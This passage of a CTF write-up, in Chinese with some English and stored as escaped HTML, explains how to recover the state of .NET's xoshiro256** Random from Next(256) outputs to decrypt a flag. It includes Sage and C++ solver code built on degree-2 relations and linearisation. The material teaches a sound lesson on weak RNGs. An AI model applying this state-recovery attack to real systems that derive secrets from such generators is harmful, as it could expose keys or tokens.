&#123;&#125;;</span><br><span class=\"line\">    lin_rel ist; <span class=\"comment\">// the initial state. dot product with symbolic output equals concrete output</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">256</span>; j++)</span><br><span class=\"line\">        ist[j] = <span class=\"built_in\">mzd_read_bit</span>(tker, <span class=\"number\">0</span>, j + <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; FLAG_LEN; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sym_u64 s1 = rng2.<span class=\"built_in\">step</span>();</span><br><span class=\"line\">        <span class=\"type\">uint64_t</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">64</span>; j++)</span><br><span class=\"line\">            x |= <span class=\"built_in\">uint64_t</span>((s1.st[j] &amp; ist).<span class=\"built_in\">count</span>() % <span class=\"number\">2</span>) &lt;&lt; j;</span><br><span class=\"line\">        <span class=\"type\">uint8_t</span> outb = <span class=\"built_in\">func</span>(x);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>, encflag[i] ^ outb);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"我的想法\"><a href=\"#我的想法\" class=\"headerlink\" title=\"我的想法\"></a>我的想法</h2><p>首先我感觉这玩意挺抽象的，思路先不谈，光那俩 cpp 除了春哥我不知道还有谁能这么点时间内造出来。<br>试着用 sage 写了下 <code>gen_rels.cpp</code>，直接慢了几十倍，好吧还是 C++ 厉害。（那之前的 MT19937 的题我是不是可以用 C++ 重写来着，又给自己挖个坑）</p>\n<p>先看看 <code>gen_rels.cpp</code> 干了些啥：对每一个 0-255 的 target，找到 20000 个能让 <code>f(x) == target</code> 的 x，然后把这些 x 的每一位都当作一个变量，构造一个矩阵，然后求这个矩阵的核，这个核就是 <code>f(x) == target</code> 的所有关系的矩阵表示。这里的矩阵是 20000*2081 的，然后用 M4RI 求核。<br>最终求出的每个向量与其对应 s1 expand 出的二次向量的内积都为 0。</p>\n<p>再看 <code>hax.cpp</code>，<del>疲软了，有空再来补坑。</del><br>时隔大半年回来补了（</p>\n<p>这里面真是一堆语法可真是把没学过 C++ 的我搞得一头雾水。<br>直接用最憨的方法，一个个看。</p>\n<p>函数 <code>func</code>： 将 <code>s1</code> 转成 <code>result</code><br><code>deg2_rel</code> 是一个 32897 维的向量，<code>deg2_rel64</code> 是 2081 维的向量，<code>lin_rel</code> 是 256 维的向量。<br>struct <code>sym_u64</code>： 64 维的向量，每一个分量都是一个 <code>lin_rel</code>，那么这应该算一个 64*256 的矩阵，并定义其异或、左移、右移、循环左移操作。<br>struct <code>sym_xs256</code>： 4 个 <code>sym_u64</code> 类型的 <code>s1 s2 s3 s4</code>，并定义了 <code>step</code> 操作，这里不是很懂，按理说这四个状态向量都是 64 位的。<br>定义了一个 <code>krels</code>，包含 256 个 <code>std::vector&lt;deg2_rel64&gt;</code> 类型的元素。每一个 <code>std::vector&lt;deg2_rel64&gt;</code> 可以包含任意数量的 <code>deg2_rel64</code> 对象。</p>\n<p>现在来看 <code>main</code> 函数：<br>把 <code>list_rels</code> 文件中的内容读入到 <code>krels</code> 中。<br>创建一个 <code>sym_xs256</code> 类的实例 <code>rng</code>，然后读进 encflag，每读一个字符更新一次 <code>rng</code> 的状态。<br>对每一个泄露的字节，找到所有 <code>krels</code> 中对应的 <code>big_rels</code>，然后对每一个 <code>big_rels</code>，新建一个类型为 <code>deg2_rel</code> 的 <code>res</code>，常数项（0 号位）和 <code>big_rels</code> 取等，1-64 号位是 $(b_1, b_2, \\cdots, b_{64})\\cdot(s_1,s_2,\\cdots,s_{64})^T$，左边的 $b$ 即为 <code>big_rels</code> 的 1-64 号位，右边是 s1 的 64*256 矩阵。后面没看懂。</p>\n<p>最后汇总到的一个 <code>all_rels</code>，求核得到的矩阵只有一个 32897 维的向量，剥出 1-256 号位得到 <code>ist</code>。</p>\n<p>整个看下来就是迷迷糊糊的。</p>\n<p>黑化了。</p>\n<p>I recently contacted the author of this challenge for assistance and was surprised by his quick response. Despite it being 00:30 when I reached out, he replied by 02:30. Given his username, I assumed he was in Russia, but his response time led me to question whether his work and rest schedule is typical or if he is not currently in Russia.</p>\n<p>The key to understanding the classes <code>sym_u64</code> and <code>sym_xs256</code> lies in the fact that the four states can be represented as a 256-bit vector. This representation forms a linear system that omits the non-linear scrambler <code>f(x)</code>. Thus, the state transition function can be expressed as a matrix, and the <code>step</code> function simply performs matrix multiplication. More specifically, the n-th state is obtained by multiplying the transition matrix $T$ by the initial state $n$ times.</p>\n<p>The construction of <code>res</code> can be explained as follows:</p>\n<p>First, it’s important to note that <code>s1</code> is a 64x256 matrix which, when multiplied by <code>ist</code>, yields the current real state of <code>s1</code>. Each <code>s1[i]</code> is a 256-dimensional vector; its dot product with <code>ist</code> determines the i-th bit of the current <code>s1</code>.<br>For each <code>res</code> in <code>all_rels</code>, <code>res</code> is computed by multiplying the <code>big_rel</code> (a 2081-dimensional vector) by a 2081x256 matrix, which is derived from <code>s1</code>.</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://github.com/colgreen/Redzen/blob/main/Redzen/Random/Xoshiro256StarStarRandom.cs\">https://github.com/colgreen/Redzen/blob/main/Redzen/Random/Xoshiro256StarStarRandom.cs</a><br><a href=\"https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/blob/master/tasks/crp/random/README.md\">https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/blob/master/tasks/crp/random/README.md</a></p>\n","excerpt":"<p>持续复健中。。。</p>","more":"<hr>\n<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>密码太狠了，这题也是 0 解。<br>给了一个 <code>Program.cs</code> 如下：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> rng = <span class=\"keyword\">new</span> Random();</span><br><span class=\"line\"><span class=\"function\"><span class=\"built_in\">byte</span>[] <span class=\"title\">Encrypt</span>(<span class=\"params\"><span class=\"built_in\">byte</span>[] x</span>)</span> =&gt; x.Select(a=&gt;(<span class=\"built_in\">byte</span>)(a^rng.Next(<span class=\"number\">256</span>))).ToArray();</span><br><span class=\"line\">Console.WriteLine(Convert.ToHexString(Encrypt(File.ReadAllBytes(<span class=\"string\">&quot;flag.txt&quot;</span>))));</span><br><span class=\"line\">Console.WriteLine(Convert.ToHexString(Encrypt(<span class=\"keyword\">new</span> <span class=\"built_in\">byte</span>[<span class=\"number\">2000</span>])));</span><br></pre></td></tr></table></figure>\n\n<p>题文如下:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">This is xoshiro256** 1.0, one of our all-purpose, rock-solid generators. It has excellent (sub-ns) speed, a state (256 bits) that is large enough for any parallel application, and it passes all tests we are aware of.</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>在 GitHub 找到了 <code>xoshiro256** 1.0</code> 的源码，状态更新函数如下：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ulong</span> t = _s1 &lt;&lt; <span class=\"number\">17</span>;</span><br><span class=\"line\">_s2 ^= _s0;</span><br><span class=\"line\">_s3 ^= _s1;</span><br><span class=\"line\">_s1 ^= _s2;</span><br><span class=\"line\">_s0 ^= _s3;</span><br><span class=\"line\">_s2 ^= t;</span><br><span class=\"line\">_s3 = BitOperations.RotateLeft(_s3, <span class=\"number\">45</span>);</span><br></pre></td></tr></table></figure>\n\n<p>提出 result 的函数如下：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = BitOperations.RotateLeft(_s1 * <span class=\"number\">5</span>, <span class=\"number\">7</span>) * <span class=\"number\">9</span></span><br></pre></td></tr></table></figure>\n\n<p>看起来也是线性的，一开始想尝试像 MT19937 一样造个状态转移矩阵出来，但是理论上状态转移矩阵是 256 维的，而他给出了 8*2000=16000 个 bit，多太多了，结果也失败了。</p>\n<h2 id=\"题解\"><a href=\"#题解\" class=\"headerlink\" title=\"题解\"></a>题解</h2><p>用 Copilot 翻译一下官方的 wp 先。</p>\n<p>当没有指定 <code>seed</code> 时，64 位机器上的最新版本的 C# 使用 xoshiro256** PRNG：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">internal</span> <span class=\"built_in\">ulong</span> <span class=\"title\">NextUInt64</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">ulong</span> s0 = _s0, s1 = _s1, s2 = _s2, s3 = _s3;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">ulong</span> result = BitOperations.RotateLeft(s1 * <span class=\"number\">5</span>, <span class=\"number\">7</span>) * <span class=\"number\">9</span>;</span><br><span class=\"line\">    <span class=\"built_in\">ulong</span> t = s1 &lt;&lt; <span class=\"number\">17</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    s2 ^= s0;</span><br><span class=\"line\">    s3 ^= s1;</span><br><span class=\"line\">    s1 ^= s2;</span><br><span class=\"line\">    s0 ^= s3;</span><br><span class=\"line\"></span><br><span class=\"line\">    s2 ^= t;</span><br><span class=\"line\">    s3 = BitOperations.RotateLeft(s3, <span class=\"number\">45</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    _s0 = s0;</span><br><span class=\"line\">    _s1 = s1;</span><br><span class=\"line\">    _s2 = s2;</span><br><span class=\"line\">    _s3 = s3;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 RNG 的状态转移函数是 GF(2) 下的线性函数，而 <code>result</code> 是 <code>s1</code> 的非线性函数。如果我们能得到 NextUInt64 的精确返回值，那么就能轻松破解 RNG。我们可以通过乘以乘法逆元来将 <code>s1</code> 的每一位表示为初始状态的线性函数，构建一个线性方程组并解出初始状态。但是这道题给出的是 <code>rng.Next(256)</code> 的输出，就是只保留 <code>result</code> 的高 8 位（草，当时以为是低 8 位）。这样就无法从中获得 <code>s1</code> 的任何信息。</p>\n<p>我们还可以检查在 <code>result</code> 的值确定的情况下，<code>s1</code> 的位之间是否存在固定的线性（或仿射）关系：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">f</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    x *= <span class=\"number\">5</span></span><br><span class=\"line\">    x %= <span class=\"number\">2</span>**<span class=\"number\">64</span></span><br><span class=\"line\">    x = (x &lt;&lt; <span class=\"number\">7</span>) | (x &gt;&gt; (<span class=\"number\">64</span> - <span class=\"number\">7</span>))</span><br><span class=\"line\">    x %= <span class=\"number\">2</span>**<span class=\"number\">64</span></span><br><span class=\"line\">    x *= <span class=\"number\">9</span></span><br><span class=\"line\">    x %= <span class=\"number\">2</span>**<span class=\"number\">64</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> x &gt;&gt; <span class=\"number\">56</span></span><br><span class=\"line\">vectors = [[] <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>)]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100000</span>):</span><br><span class=\"line\">    a = random.getrandbits(<span class=\"number\">64</span>)</span><br><span class=\"line\">    v = vector(GF(<span class=\"number\">2</span>), <span class=\"string\">&#x27;1&#x27;</span> + <span class=\"built_in\">bin</span>(a)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">64</span>))</span><br><span class=\"line\">    vectors[f(a)].append(v)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">    mat = matrix(GF(<span class=\"number\">2</span>), vectors[i])</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(mat.rank(), <span class=\"built_in\">len</span>(vectors[i]))</span><br></pre></td></tr></table></figure>\n\n<p>对于每个 <code>result</code> 的值，这个程序生成了一些随机的 <code>s1</code> 的可能值，然后计算由这些值的位（和一个 1 来处理异或 1 的子集）生成的矩阵的秩。所有 256 个矩阵的秩都是 65，这意味着向量是独立的，对于任何 <code>result</code> 的值都不存在固定的仿射关系，因此无法从中获得任何信息。</p>\n<blockquote>\n<p>这里的秩应该是倾向列秩，即他的意思是对于 <code>s1</code> 的 bits，不存在哪个 bit 能由其他 bits 线性组合（或者线性组合再取反）后得到。不是很明白检查这个有啥用。</p>\n</blockquote>\n<p>可以获得<strong>概率</strong>线性关系，但是解线性系统就变成了 LPN（Learning Parity with Noise, 带噪声的学习奇偶校验）问题，据我所知，目前还没有足够快的算法。</p>\n<blockquote>\n<p>LPN 问题具体来说是这样的：给定一个二进制矩阵 $A$ 和一个噪声向量 $e$，求解未知的二进制向量 $s$ 使得 $As + e = b\\pmod2$。其中，$A$ 是一个随机生成的二进制矩阵，$s$ 是一个未知的二进制向量，$e$ 是一个含有少量随机错误的二进制向量，$b$ 是我们观测到的结果向量。噪声向量 $e$ 的存在使得这个问题变得非常困难。</p>\n</blockquote>\n<p>这里可能有多个解；我找到的解是检查<strong>二次关系</strong>：</p>\n<blockquote>\n<p>这里不是很懂，为啥没有线性关系就能有二次关系。</p>\n</blockquote>\n<ul>\n<li>假设 <code>result</code> 的值是固定的，可能存在非平凡的次数 &lt;=2 的布尔函数，当在 <code>s1</code> 上取值时总是为真。函数 <code>f(...) = 1</code> 符合这个描述，但是不值得考虑，因为它不提供任何信息。</li>\n<li>函数可以写成 $$f(x_1, \\dots, x_{64}) = k_0 + \\sum_{i} k_i x_i + \\sum_{i \\le j} k_{ij} x_i x_j,$$ 并且 <code>s1</code> 的每一位都可以表示为 $\\sum_i k_i s_i$，其中 s 是初始状态。</li>\n<li>我们可以直接将 <code>s1</code> 的位的表达式代入 $f$，展开括号并获得对初始状态为真的二次方程。</li>\n</ul>\n<p>我们仍然需要找到这些二次布尔函数。这可以通过生成许多随机的 64 位向量来完成，这些向量对应于给定的 <code>result &gt;&gt; 56</code> 的值，为它们中的每一个计算所有 $1 + 64 + \\frac{64 \\cdot 63}2 = 2081$ 个单项式，并找到矩阵的核。实现在 <code>gen_rels.cpp</code> 中，它平均每个输出字节找到 23 个方程。</p>\n<p>这使我们能够在 256 个变量上创建一个超定的二次方程组，它的初始状态是它的（希望是唯一的）解。我用来解决它的算法是线性化：我们可以将每个单项式（如 $x_1x_2$）视为单独的变量。然后我们将有一个线性方程组，其中 $1 + 256 + \\frac{256 \\cdot 255}2 = 32897$ 个变量，可以使用 M4RI 解决。实现在 <code>hax.cpp</code> 中，它期望 <code>gen_rels.cpp</code> 的输出在文件 <code>list_rels</code> 中，<code>output.txt</code> 的十六进制解码版本在文件 <code>out_bin</code> 中。</p>\n<blockquote>\n<p>M4RI（Method of Four Russians for Inversion，四俄方法的逆运算方法）是一种针对有限域 GF(2) 上的矩阵运算（特别是矩阵求逆）的高效算法。它的名字来源于一种叫做“四俄罗斯算法”的技术，该技术是为了加速某些基本运算而发明的。<br>在 Debian 系中可通过 <code>sudo apt-get install libm4ri-dev</code> 安装 M4RI 库。</p>\n</blockquote>\n<p><code>gen_rel.cpp</code> 如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;random&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;m4ri/m4ri.h&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\">// we need to find degree 2 relations that hold certainly</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">uint8_t</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"type\">uint64_t</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    x *= <span class=\"number\">5</span>;</span><br><span class=\"line\">    x = (x &lt;&lt; <span class=\"number\">7</span>) | (x &gt;&gt; (<span class=\"number\">64</span> - <span class=\"number\">7</span>));</span><br><span class=\"line\">    x *= <span class=\"number\">9</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x &gt;&gt; <span class=\"number\">56</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">process</span><span class=\"params\">(<span class=\"type\">uint8_t</span> tgt)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::mt19937_64 mt;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> n_cols = <span class=\"number\">1</span>;</span><br><span class=\"line\">    n_cols += <span class=\"number\">64</span>;</span><br><span class=\"line\">    n_cols += <span class=\"number\">64</span> * <span class=\"number\">63</span> / <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;%zu monomials\\n&quot;</span>, n_cols);</span><br><span class=\"line\">    <span class=\"type\">mzd_t</span> *A = <span class=\"built_in\">mzd_init</span>(<span class=\"number\">20000</span>, n_cols);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> ri = <span class=\"number\">0</span>; ri &lt; A-&gt;nrows; ri++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"type\">uint64_t</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">do</span></span><br><span class=\"line\">            x = <span class=\"built_in\">mt</span>();</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"built_in\">f</span>(x) != tgt);</span><br><span class=\"line\">        <span class=\"comment\">//printf(&quot;%zu\\n&quot;, x);</span></span><br><span class=\"line\">        <span class=\"type\">size_t</span> mi = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">mzd_write_bit</span>(A, ri, mi++, <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">            <span class=\"built_in\">mzd_write_bit</span>(A, ri, mi++, (x &gt;&gt; i) &amp; <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> j = <span class=\"number\">0</span>; j &lt; i; j++)</span><br><span class=\"line\">            <span class=\"built_in\">mzd_write_bit</span>(A, ri, mi++, (x &gt;&gt; i) &amp; (x &gt;&gt; j) &amp; <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"built_in\">assert</span>(mi == n_cols);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">mzd_t</span>* ker = <span class=\"built_in\">mzd_kernel_left_pluq</span>(A, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;mat dim: %zu rows, %zu cols\\n&quot;</span>, A-&gt;nrows, A-&gt;ncols);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;ker dim: %zu rows, %zu cols\\n&quot;</span>, ker-&gt;nrows, ker-&gt;ncols);</span><br><span class=\"line\">    <span class=\"type\">mzd_t</span>* tker = <span class=\"built_in\">mzd_transpose</span>(<span class=\"literal\">nullptr</span>, ker);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;tker dim: %zu rows, %zu cols\\n&quot;</span>, tker-&gt;nrows, tker-&gt;ncols);</span><br><span class=\"line\">    <span class=\"built_in\">mzd_free</span>(A);</span><br><span class=\"line\">    <span class=\"built_in\">mzd_free</span>(ker);</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    // check again that the relations are certain (not very fast)</span></span><br><span class=\"line\"><span class=\"comment\">    for(size_t ri = 0; ri &lt; tker-&gt;nrows; ri++)</span></span><br><span class=\"line\"><span class=\"comment\">    &#123;</span></span><br><span class=\"line\"><span class=\"comment\">        for(size_t _ = 0; _ &lt; 100000; _++)</span></span><br><span class=\"line\"><span class=\"comment\">        &#123;</span></span><br><span class=\"line\"><span class=\"comment\">            uint64_t x = 0;</span></span><br><span class=\"line\"><span class=\"comment\">            do</span></span><br><span class=\"line\"><span class=\"comment\">                x = mt();</span></span><br><span class=\"line\"><span class=\"comment\">            while(f(x) != tgt);</span></span><br><span class=\"line\"><span class=\"comment\">            //printf(&quot;%zu\\n&quot;, x);</span></span><br><span class=\"line\"><span class=\"comment\">            size_t nm = 0;</span></span><br><span class=\"line\"><span class=\"comment\">            size_t mi = 0;</span></span><br><span class=\"line\"><span class=\"comment\">            nm ^= mzd_read_bit(tker, ri, mi++);</span></span><br><span class=\"line\"><span class=\"comment\">            for(size_t i = 0; i &lt; 64; i++)</span></span><br><span class=\"line\"><span class=\"comment\">                nm ^= mzd_read_bit(tker, ri, mi++) &amp; (x &gt;&gt; i) &amp; 1;</span></span><br><span class=\"line\"><span class=\"comment\">            for(size_t i = 0; i &lt; 64; i++)</span></span><br><span class=\"line\"><span class=\"comment\">            for(size_t j = 0; j &lt; i; j++)</span></span><br><span class=\"line\"><span class=\"comment\">                nm ^= mzd_read_bit(tker, ri, mi++) &amp; (x &gt;&gt; i) &amp; (x &gt;&gt; j) &amp; 1;</span></span><br><span class=\"line\"><span class=\"comment\">            //assert(mi == n_cols);</span></span><br><span class=\"line\"><span class=\"comment\">            assert(nm == 0);</span></span><br><span class=\"line\"><span class=\"comment\">        &#125;</span></span><br><span class=\"line\"><span class=\"comment\">    &#125;</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> ri = <span class=\"number\">0</span>; ri &lt; tker-&gt;nrows; ri++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>, (<span class=\"type\">int</span>)tgt);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> ci = <span class=\"number\">0</span>; ci &lt; tker-&gt;ncols; ci++)</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d&quot;</span>, (<span class=\"type\">int</span>)<span class=\"built_in\">mzd_read_bit</span>(tker, ri, ci));</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">mzd_free</span>(tker);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">256</span>; i++)</span><br><span class=\"line\">        <span class=\"built_in\">process</span>(i);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>hax.cpp</code> 如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span 